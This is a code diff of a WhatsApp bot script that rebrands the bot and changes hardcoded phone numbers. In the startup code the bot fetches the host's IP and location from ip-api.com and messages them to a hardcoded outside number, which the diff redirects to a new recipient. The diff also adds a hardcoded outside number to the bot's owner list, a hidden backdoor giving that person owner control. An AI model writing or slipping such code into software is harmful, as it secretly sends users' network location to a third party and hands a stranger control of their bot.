@@ -43,7 +43,7 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'blue'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("919633687665@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Krishnadas",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/919633687665?text=Hi bro"}}})
+       denz.sendMessage("919745310120@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Krishnadas",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/919633687665?text=Hi bro"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'red'))
    })
       
@@ -69,7 +69,7 @@ exec(`cd /sdcard/download && play *mp3`)
    
    denz.on('chat-update', async (mek) => {
         require('./denz.js')(denz, mek)
-        ownerNumber = ["919633687665@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
+        ownerNumber = ["919745310120L@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
         dtod = "@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
@@ -123,7 +123,7 @@ mhan = await denz.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: 
 const buttonMessages = {
 imageMessage: mhan.message.imageMessage,
 contentText: `${masuk}`,
-footerText: `ꪶ 𝑲𝑹𝑰𝒁⇥𝑺𝑬𝑹ꫂ⁩`, 
+footerText: `ꪶ RAFHAN SERꫂ⁩`, 
 buttons: gbutsan,
 headerType: 4
 }
@@ -239,7 +239,7 @@ denz.sendMessage(m.key.remoteJid, `▷\`\`\`𝙰𝙽𝚃𝙸 𝙳𝙴𝙻𝙴�
 
 ➬ \`\`\`𝙽𝙰𝙼𝙴 : @${m.participant.split("@")[0]}\`\`\`
 ➬ \`\`\`𝚃𝚈𝙿𝙴 : ${c3type}\`\`\`
-➬ \`\`\`𝙱𝙾𝚃 : 𝙿𝚁𝙸𝚅𝙰𝚃𝙴 - 𝙱𝙾𝚃 𝙱𝚈 - ꪶ 𝐾𝑅𝐼𝑆𝐻𝑁𝐴𝐷𝐴𝑆ꫂ⁩\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
+➬ \`\`\`𝙱𝙾𝚃 : 𝙿𝚁𝙸𝚅𝙰𝚃𝙴 - 𝙱𝙾𝚃 𝙱𝚈 - ꪶ RAFHAN SERꫂ⁩\`\`\``, MessageType.text, {quoted: m.message, contextInfo: {"mentionedJid": [m.participant]}})
 }
 })
 }
